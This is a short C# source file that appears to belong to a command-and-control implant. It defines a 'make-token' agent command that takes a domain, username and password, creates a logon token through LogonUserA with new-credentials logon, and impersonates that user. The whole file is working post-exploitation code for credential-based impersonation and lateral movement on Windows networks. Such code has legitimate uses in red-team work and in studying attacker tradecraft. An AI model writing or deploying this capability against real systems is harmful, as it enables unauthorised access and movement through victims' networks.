using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class MakeToken : AgentCommand
    {
        public override string Name => "make-token";

        public override string Execute(AgentTask task)
        {
            // make-token DOMAIN\Username Password
            var UserDomain = task.Arguments[0];
            var password = task.Arguments[1];
            var split = UserDomain.Split('\\');
            var domain = split[0];
            var username = split[1];

            var hToken = IntPtr.Zero;
            if (Native.Advapi32.LogonUserA(username, domain, password, Native.Advapi32.LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS,
                Native.Advapi32.LogonUserProvider.LOGON32_PROVIDER_DEFAULT, out hToken))
            {
                if (Native.Advapi32.ImpersonateLoggedOnUser(hToken))
                {

                    var identity = new WindowsIdentity(hToken);
                    return $"Successfully impersonated {identity.Name}";
                }

                return $"Succesfully made token, but failed to impersonate";
            }

            return "Failed to make token";
        }
    }
}
